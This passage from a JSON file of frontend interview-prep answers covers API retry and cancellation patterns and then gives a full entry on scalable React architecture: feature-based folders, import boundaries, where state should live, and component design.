`500` or a network blip, yes. A `400` or `422` will fail identically forever — retrying is pure latency.\n\n**Back off exponentially**, with jitter. Fixed-interval retries from thousands of clients produce a thundering herd that keeps a recovering server down. You already have this at [/coding/25](/coding/25).\n\n**Cancel what you don't need.** `AbortController` on unmount and on superseded requests:\n\n```javascript\nuseEffect(() => {\n  const controller = new AbortController();\n\n  getUsers({ signal: controller.signal })\n    .then(setUsers)\n    .catch((err) => { if (err.name !== 'AbortError') setError(err); });\n\n  return () => controller.abort();\n}, [query]);\n```\n\n**The race condition this prevents is the thing to name out loud.** Type \"a\", then \"ab\". Two requests in flight. If \"a\" resolves *second*, you render results for a query the user has moved past. Aborting — or the `cancelled` flag pattern — is what keeps the UI honest ([/advanced-react/15](/advanced-react/15)).\n\n## Why you probably shouldn't hand-roll all of this\n\nReact Query / SWR / RTK Query give you caching, deduplication of in-flight requests, background refetch, retry with backoff, and cancellation — the things above, already correct.\n\n**The framing that reads as senior:** server data is not really *state* you own. It's a **cache of something that lives elsewhere and changes without telling you.** Once you see it that way, putting it in Redux alongside your UI state feels wrong, and a purpose-built server-cache library feels obviously right ([/react-guide/27](/react-guide/27), [/react-learnings/26](/react-learnings/26)).\n\n## Follow-ups\n\n**\"How do you handle a slow endpoint?\"** — Diagnose first: slow server, large payload, or a waterfall? Fixes differ — pagination, field selection, parallelizing with `Promise.all`, prefetching on hover, or optimistic UI so the user isn't waiting at all.\n\n**\"Where does validation live?\"** — Both ends. Client-side for fast feedback; server-side because the client can be bypassed entirely. Say both, always.\n\n**\"How do you handle partial failure on a dashboard?\"** — `Promise.allSettled`, not `Promise.all`. One dead widget shouldn't blank the page. This is a great chance to show you know why `all`'s fail-fast is sometimes wrong ([/interview-prep/2](/interview-prep/2)).\n\n**\"Polling, SSE, or WebSockets?\"** — Polling for infrequent updates, simplest and cache-friendly. **SSE** for one-way server push (notifications, live feeds) — plain HTTP, auto-reconnects. **WebSockets** when you need genuinely bidirectional, low-latency traffic (chat, collaborative editing), at the cost of connection state and scaling complexity."
    },
    {
      "id": 160,
      "title": "Scalable React Architecture",
      "tags": [
        "architecture",
        "React",
        "state"
      ],
      "source": "user request: 1-day interview prep - browser & architecture",
      "answer": "**Scalable React architecture** is the set of choices that keep a codebase changeable after it grows past the point where one person can hold it in their head.\n\nTo put it simply: the goal isn't a clever folder structure. It's that a new feature touches few files, and deleting a feature is easy.\n\n## The Problem\n\nSmall apps are organized **by type**: all components in `/components`, all hooks in `/hooks`, all utilities in `/utils`.\n\n```\nsrc/\n  components/   Button, Modal, UserCard, OrderRow, CheckoutForm, ...\n  hooks/        useAuth, useCart, useOrders, useDebounce, ...\n  utils/\n```\n\nAt 20 files that's fine. At 300 it breaks down in a specific way: **the files that change together live furthest apart.** Working on checkout means jumping between four top-level directories. Nothing tells you which parts of `/components` belong to checkout, so nobody dares delete anything, and everything is imported by everything.\n\n## The Solution — organize by feature\n\nGroup by **what it does**, not **what it is**:\n\n```\nsrc/\n  features/\n    checkout/\n      components/      only used by checkout\n      hooks/\n      api.js\n      types.js\n      index.js         ← the public surface of this feature\n    orders/\n    auth/\n  shared/\n    components/        genuinely generic: Button, Modal, Input\n    hooks/             useDebounce, useLocalStorage\n    lib/               http client, formatters\n  app/                 routing, providers, global layout\n```\n\nTwo properties fall out of this, and they're the ones worth naming in an interview:\n\n**Changes are local.** A checkout change touches `features/checkout/` and usually nothing else.\n\n**Deletion is possible.** Kill the feature, delete the folder. That is the real test of whether a boundary exists — if you can't delete a feature by deleting its folder, you don't have modules, you have a pile.\n\n## The rule that keeps it from rotting\n\nStructure alone doesn't hold. You need one import rule:\n\n> **Features may import from `shared`. Features may not import from each other's internals.**\n\nEach feature exposes an `index.js`; everything else is private. Cross-feature imports go through that barrel, or don't happen at all.\n\n```javascript\nimport { CheckoutButton } from '@/features/checkout';         // fine\nimport { calcTax } from '@/features/checkout/utils/tax';       // reaching inside — no\n```\n\nYou can enforce this mechanically with `eslint-plugin-boundaries` or an `import/no-restricted-paths` rule. **Mentioning that you'd enforce it with lint rather than documentation is a strong signal** — conventions that aren't enforced decay, and everyone who has worked on a large codebase knows it.\n\nWhen two features genuinely need the same thing, it moves to `shared`. That promotion should be deliberate, not accidental.\n\n## State ownership — the decision ladder\n\nMost architecture pain is misplaced state. Work down this list and stop at the first thing that works:\n\n1. **Local `useState`** — start here always. Most state is local and stays local.\n2. **Lifted to the closest common parent** — when two siblings need it.\n3. **`useReducer`** — when several values change together under clear rules.\n4. **URL** — filters, tabs, pagination, search. Genuinely underused: it's shareable, survives refresh, and gives you back/forward for free. If a user could reasonably want to bookmark it, it belongs in the URL.\n5. **Context** — genuinely app-wide and rarely changing: theme, current user, locale. **Not** a general state manager; every consumer re-renders when the value changes ([/react-guide/28](/react-guide/28)).\n6. **A store (Redux/Zustand)** — complex client state, shared widely, with real update logic.\n7. **A server-cache library (React Query/RTK Query)** — anything that came from an API.\n\n**The most valuable distinction here is 6 vs 7.** Server data isn't your state — it's a cache of something owned elsewhere that changes without telling you. Once you separate \"server cache\" from \"client state,\" most apps discover their global store was 80% cached API responses and shrinks dramatically ([/react-learnings/26](/react-learnings/26)).\n\nSay this out loud: *\"The most common architecture mistake I see is putting server data in Redux. It looks like state, but you end up hand-writing caching, invalidation, and loading flags that a query library already gets right.\"*\n\n## Component design\n\n**Split presentational from container** — not as a strict rule, but as a habit. A component that fetches, transforms, and renders is hard to test and impossible to reuse. Push data-fetching to the edge; keep leaf components dumb and prop-driven.\n\n**Composition over configuration.** When a component grows a tenth boolean prop, it wants to be composed instead:\n\n```jsx\n// Configuration — every new variant adds a prop and a branch\n<Card title=\"x\" showFooter showAvatar isCompact hasBorder />\n\n// Composition — new variants need no changes to Card\n<Card>\n  <Card.Header avatar={<Avatar />}>x</Card.Header>\n  <Card.Footer>…</Card.Footer>\n</Card>\n```\n\n**Custom hooks for behavior, components for markup.** If you're reusing logic, extract a hook. If you're reusing appearance, extract a component. Trying to reuse both at once is what produces components nobody can modify ([/react-guide/13](/react-guide/13)).\n\n**Colocate.** A component's styles, tests, and stories live beside it, not in a mirrored tree three directories away.\n\n## The rest of the picture\n\n- **Error boundaries per route or feature**, so one crash doesn't blank the app ([/react-guide/25](/react-guide/25))\n- **Code splitting at route level** first — the highest ratio of benefit to effort\n- **A design system / shared primitives**, so 14 button implementations never happen\n- **TypeScript at the boundaries** — API responses and component props are where it pays for itself\n- **Tests at the behavior level**, not the implementation level ([/react-guide/34](/react-guide/34))\n- **Micro-frontends** only when the constraint is *organizational* — separate teams needing independent deploys. They add real runtime and build complexity, and adopting them for a single team is a net loss ([/react-guide/36](/react-guide/36))\n\n## Follow-ups\n\n**\"How would you migrate a large codebase to this?\"** — Incrementally, never a big-bang rewrite. Add `features/` alongside the existing structure, put all *new* work there, and move existing code only when you're already touching it. A rewrite that runs for six months while the old app keeps changing is how these efforts die.\n\n**\"How do you stop `shared` becoming a junk drawer?\"** — Promotion is deliberate: something moves to `shared` when a *second* feature needs it, not in anticipation. And `shared` may never import from `features` — that's the dependency-direction rule, and it's lintable.\n\n**\"How do you keep bundle size under control as it grows?\"** — Budgets in CI that fail the build on regression, route-level splitting, and a bundle analyzer in the review process. The key insight is that it has to be **automated** — size creeps back the moment it depends on someone remembering."
    }
  ]
}
